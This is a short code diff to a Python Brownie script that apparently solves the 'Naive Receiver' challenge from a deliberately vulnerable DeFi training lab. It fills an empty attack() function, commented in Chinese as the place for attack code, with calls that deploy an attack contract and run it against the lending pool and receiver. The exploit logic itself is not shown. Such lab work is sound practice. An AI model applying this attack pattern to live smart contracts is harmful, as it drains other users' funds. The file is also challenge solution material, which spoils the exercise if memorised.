@@ -1,4 +1,4 @@
-from brownie import NaiveReceiverLenderPool, FlashLoanReceiver, DamnValuableToken
+from brownie import NaiveReceiverLenderPool, FlashLoanReceiver, AttackNaiveReceiver
 from web3 import Web3
 import time, sys
 from scripts.helpful_scripts import get_accounts
@@ -25,6 +25,8 @@ def deploy():
 
 def attack():
     # 攻击代码写到这里
+    attack_contract = AttackNaiveReceiver.deploy({"from": attacker})
+    attack_contract.attack(pool, receiver).wait(1)
     return
 
 
